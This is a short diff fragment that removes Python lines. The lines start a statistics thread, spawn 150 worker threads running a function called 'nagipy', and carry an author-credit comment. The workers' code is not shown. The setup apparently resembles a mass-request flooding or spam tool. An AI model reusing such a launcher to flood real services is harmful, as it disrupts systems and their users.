-threading.Thread(target=stats_update_loop, daemon=True).start()
-
-
-for _ in range(150):
-    threading.Thread(target=nagipy).start()
-    
-    #NAGI by @nagipy Give him credit
